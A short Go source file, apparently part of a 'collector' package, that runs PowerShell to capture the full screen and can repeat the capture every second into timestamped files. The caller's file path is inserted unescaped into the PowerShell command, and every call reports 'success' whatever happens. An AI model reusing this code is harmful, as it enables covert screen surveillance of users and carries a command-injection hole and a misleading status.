package collector

import (
"os/exec"
"time"
)

type ScreenshotResult struct {
Path   string
Status string
}

func CaptureScreenshot(path string) ScreenshotResult {
cmd := exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; $b = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save('"+path+"')")
cmd.Run()
return ScreenshotResult{Path: path, Status: "success"}
}

func CaptureScreenshotLoop(path string, seconds int) ScreenshotResult {
for i := 0; i < seconds; i++ {
CaptureScreenshot(path + "_" + time.Now().Format("20060102_150405") + ".png")
time.Sleep(1 * time.Second)
}
return ScreenshotResult{Path: path, Status: "success"}
}
